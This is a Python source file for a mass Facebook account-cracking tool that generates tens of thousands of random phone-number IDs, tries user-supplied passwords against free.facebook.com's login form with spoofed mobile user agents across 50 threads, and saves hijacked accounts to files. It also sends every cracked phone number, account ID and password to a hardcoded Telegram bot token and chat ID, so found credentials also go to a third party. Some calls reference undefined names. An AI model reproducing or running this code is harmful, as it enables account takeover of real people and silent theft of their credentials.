#GEN CODESS FROM IPYTHONI
import os,sys,time,json,random,re,string,platform,base64,uuid,webbrowser

from bs4 import BeautifulSoup as sop
from rich import print as cetak
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    print(' ')
    


            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.006)
            
ORANGE = '\033[1;35m'
GREEN = '\033[1;32m'
WHITE = '\033[1;97m' #
BLUE = '\033[1;33m'
YELLOW = '\033[1;33m'
RED = '\033[1;91m'
M = '\x1b[1;97m' # PUTIH
P = '\x1b[1;91m' # MERAH
K = '\x1b[1;92m' # HIJAU
td1='5532'
td2='739643'
td3=td1+td2
H = '\x1b[1;93m' # KUNING
U = '\x1b[1;94m' # BIRU
B = '\x1b[1;95m' # UNGU
N = '\x1b[1;96m' # BIRU MUDA
O = '\x1b[0m'    # WARNA MATI
BN = '\x1b[1;90m' # WARNA ABU ABU
A = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
taka1='''6185155529:AAGaEW07lrPLXLW7L7XTAPBoUjMQkqo0Gjw'''
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =  ("""                         
\033[1;31m  _ __ ___   ___ | |__   __ _ _ \033[1;32m__ ___   __ _  __| |
\033[1;33m | '_ ` _ \ / _ \| '_ \ / _` | '_ ` \033[1;34m_ \ / _` |/ _` |
\033[1;35m | | | | | | (_) | | | | (_| | | | | | | \033[1;36m(_| | (_| |
\033[1;32m |_| |_| |_|\___/|_| |_|\__,_|_| \033[1;33m|_| |_|\__,_|\__,_|

 
 \033[1;31m𝑮𝑰𝑻𝑯𝑼𝑷    : \033[1;32mmohamad anan\033[1;31m
 𝘼𝙐𝙏𝙃𝙊𝙍       : \033[1;33m@jiooler
 \033[1;31mINSTAGR𝑹𝑨𝑴  : \033[1;33m@jiooler                 
 \033[1;31m𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴  : \033[1;33m@jiooler  @M0M0MI_2
 \033[1;31m𝑻𝑶𝑶𝑳 𝑵𝑨𝑴𝑬 :\033[1;33mmohamad fb 𝑩𝑳𝑨𝑪𝑲         
             """)
loop = 0
oks = []
cps = []



def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    
    
    code = '6'
    os.system("clear")
    jalan('فضلاً اشترك بالبوت                                                   ')
    webbrowser.open('https://t.me/MARKTEBOT?start=2079638177')
    limit = 50000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(3)
    HamiiID = []
    for bilal in range(passx):
        pww= input('\033[1;34mput password:\033[1;31m')
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;91m')
        tto1='\033[1;91m Total IDS:''\033[1;93m'+tl
        cetak(nel(tto1))
        print('\033[1;96m\033[1;36mt\033[1;31mo\033[1;32mo\033[1;33ml\033[1;35m p\033[1;36my:\033[1;31mm\033[1;32mo\033[1;33mh\033[1;35ma\033[1;36mm\033[1;31ma\033[1;32md\033[1;33m a\033[1;35mn\033[1;36ma\033[1;31mn \033[31m@j\033[32mi\033[33mo\033[35mo\033[36ml\033[31me\033[32mr')
        tto2='\033[1;91m note:\033[1;92m وانت تنتظر صيدك صلي على نبييك\033[1;93m '
        cetak(nel(tto2))
        jalan('\033[1;31m●\033[1;35m○\033[1;33m●'*16)
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;34m >_CRACK TAWAW_<')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                open('okmohamad.txt', 'a').write( cid+' | '+ps+'\n')
                to ='phone unmber==>+'+uid+'\n' 'id==>'+cid+'\npassword==>'+ps+'\n'+'account==> https://www.facebook.com/profile.php?id='+cid
                oi = nel(to, style='green')
                cetak(nel(oi, style='cyan', title='محمد عنان جابلك صيد'))
                
                

                requests.get("https://api.telegram.org/bot"+str(taka1)+"/sendMessage?chat_id="+str(td3)+"&text="+str(to))
                cek_apk(session,coki)
                open('/sdcard/صيد محمد عنان/mohamad ok.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                follow(self, session, coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                to1 ='phone unmber==>+'+uid+'\n' 'id==>'+cid+'\npassword==>'+ps+'\n'+'account==> https://www.facebook.com/profile.php?id='+cid
                requests.get("https://api.telegram.org/bot"+str(taka1)+"/sendMessage?chat_id="+str(td3)+"&text="+str(to))
                oi1 = nel(to1, style='red')
                cetak(nel(oi1, style='yellow', title='حساب سيكور'))
                open('/sdcard/صيد محمد عنان/cp.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[%s/%s]  [OK BLACK:%s]  [CP BLACK:%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

i()

